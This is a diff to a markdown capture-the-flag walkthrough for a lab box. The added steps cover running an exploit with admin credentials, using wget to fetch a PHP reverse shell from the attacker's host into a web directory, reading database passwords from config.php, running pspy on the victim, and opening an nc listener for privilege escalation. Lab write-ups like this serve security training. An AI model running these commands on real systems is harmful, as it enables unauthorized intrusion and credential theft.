@@ -78,7 +78,7 @@ Password: OllieUnixMontgomery!
 **Kali**
 
 ```
-python3 exploit.py  -usr admin -pwd OllieUnixMontgomery! -cmd 'whoami' -url http://10.10.109.76
+python3 exploit.py  -usr admin -pwd OllieUnixMontgomery! -cmd 'whoami' -url http://$VICTIM
 ```
 
 <figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
@@ -111,14 +111,13 @@ We have access to write to the immaolllieeboyyy directory so we put our shell th
 **Browser**
 
 ```
-wget http://10.10.217.212:81/php-reverse-shell.php -O immaolllieeboyyy/test.php
+wget http://$KALI:81/php-reverse-shell.php -O immaolllieeboyyy/test.php
 ```
 
 **Browser**
 
-```
-/immaolllieeboyyy/test.php
-```
+<pre><code><strong>http://VICTIM:/immaolllieeboyyy/test.php
+</strong></code></pre>
 
 <figure><img src="../../.gitbook/assets/image (635).png" alt=""><figcaption></figcaption></figure>
 
@@ -129,7 +128,7 @@ wget http://10.10.217.212:81/php-reverse-shell.php -O immaolllieeboyyy/test.php
 Get autocomplete
 
 ```
-python -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
 ctrl + Z
 stty raw -echo;fg
 ```
@@ -143,12 +142,70 @@ grep -ir "pass" config.php -A4 -B4
 
 <figure><img src="../../.gitbook/assets/image (637).png" alt=""><figcaption></figcaption></figure>
 
+We can login to mysql but didn't find anything
+
 **Victim**
 
 ```
 mysql -uphpipam_ollie -pIamDah1337estHackerDog!
+```
+
+
+
+**Victim**
 
 ```
+su ollie
+Password: OllieUnixMontgomery!
+```
+
+<figure><img src="../../.gitbook/assets/image (638).png" alt=""><figcaption></figcaption></figure>
+
+## PSPY
+
+**Kali**
+
+```
+wget http://$KALI:81/pspy32 
+chmod +x pspy32 
+./pspy32 
+```
+
+**Victim**
+
+```
+cd /tmp/
+wget http://10.10.231.159:81/pspy32 
+chmod +x pspy32 
+./pspy32
+find / -name "feedme" 2>/dev/null 
+```
+
+<figure><img src="../../.gitbook/assets/image (640).png" alt=""><figcaption></figcaption></figure>
+
+## Privilege Escalation
+
+<figure><img src="../../.gitbook/assets/image (641).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (642).png" alt=""><figcaption></figcaption></figure>
+
+**Kali**
+
+```
+nc -lvnp 1338
+```
+
+<figure><img src="../../.gitbook/assets/image (643).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (644).png" alt=""><figcaption></figcaption></figure>
+
+
+
+
+
+
+
+
 
 
 
